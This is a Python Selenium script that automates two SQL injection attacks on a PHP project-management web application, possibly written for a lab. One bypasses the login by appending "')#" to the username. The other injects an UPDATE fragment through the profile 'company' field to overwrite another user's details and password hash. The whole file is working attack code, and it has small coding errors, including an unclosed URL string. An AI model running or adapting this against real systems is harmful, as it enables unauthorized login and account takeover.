from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import hashlib 
def get_initialise_driver():
	driver = webdriver.Chrome()
	driver.get("http://host:8080/)
	if "Login" in driver.title:
		return driver
	else: 
		print("An error has occured while trying to reach the login page!")


def account_login_attack():
	username = input("Please input the account username to login as: ")
	driver = get_initialise_driver()
	driver = account_login(driver,username)
	if "Desktop" in driver.title:
		print("Attack Complete!")
	else:
		print("Attack Failed, invalid username?")

def account_login(driver, user):
	username_field = driver.find_element_by_name("username")
	username_field.clear()
	username_field.send_keys(user+"')#")
	username_field.send_keys(Keys.RETURN)
	return driver

def account_mod_attack():
	perp_username = input("Please input the account username perpetrate the attack: ")
	vict_username = input("Please input the victims username: ") 
	attack_string = account_mod_attack_build_attack_string(vict_username)
	#print(attack_string)
	driver = get_initialise_driver()
	driver = account_login(driver,perp_username)
	if "Desktop" not in driver.title:
		print("Attack Failed, invalid perpetrator username?")
		return

	account_link = driver.find_element_by_xpath("//a[@href='manageuser.php?action=profile&id=5']")
	account_link.click()
	account_link = driver.find_element_by_xpath('//*[@id="contentwrapper"]/div[1]/ul/li[2]/a')
	account_link.click()

	company_field = driver.find_element_by_name("company")
	company_field.send_keys(attack_string)

	submit_link = driver.find_element_by_xpath('//*[@id="content-left-in"]/div/div[1]/form/fieldset/table/tbody/tr/td[2]/div/div/table/tbody[21]/tr/td[2]/button')
	submit_link.click()


def account_mod_attack_build_attack_string(victim_user):
	attack_string = "'"
	new_user = input("New Victim Name: ")or victim_user
	attack_string= attack_string + account_mod_attack_key_value_pair("name",new_user)
	new_company = input("New Victim Company: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("company",new_company)
	new_email = input("New Victim E-Mail: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("email",new_email)
	new_phone = input("New Victim Phone: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("tel1",new_phone)
	new_cell = input("New Victim Cell Phone: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("tel2",new_cell)

	new_url = input("New Victim URL: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("url",new_url)
	new_addr = input("New Victim Address: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("adress",new_addr)
	new_postcode = input("New Victim Postcode: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("zip",new_postcode)
	new_city = input("New Victim City: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("adress2",new_city)
	new_country = input("New Victim Country: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("country",new_country)
	new_state = input("New Victim State: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("state",new_state)
	
	new_gender = input("New Victim Gender (m/f): ")
	attack_string= attack_string + account_mod_attack_key_value_pair("gender",new_gender)
	new_locale = input("New Victim Locale (al,ar,ca,cs,da,de,el,en,es,fa,fi,fr,hr,hu,it,ja,lt,nb,nl,pl,pt,pt_br,ro,ru,se,sk,sl,sr,tr,uk,zh): ")
	attack_string= attack_string + account_mod_attack_key_value_pair("locale",new_locale)

	hourly_rate = input("New Victim Hourly Rate: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("rate",hourly_rate)
	
	new_pass = input("New Victim Password: ")
	attack_string= attack_string + account_mod_attack_key_value_pair("pass",str(hashlib.sha1(new_pass.encode()).hexdigest()))

	attack_string = attack_string + " WHERE name = '"+victim_user+"' # "
	return attack_string

def account_mod_attack_key_value_pair(key,value):
	if (value):		
		return ","+key+"='"+value+"'"
	return ""

attack_method = int(input("Please selected an attack: Account Login (1) or Account Modification (2): "))

if (attack_method ==1):
	account_login_attack()
elif (attack_method == 2):
	account_mod_attack()
result = input("When finished please press enter to close the browser: ")
try:
	driver.close()
except:
	print("Error when closing driver, did you already close it?")
	
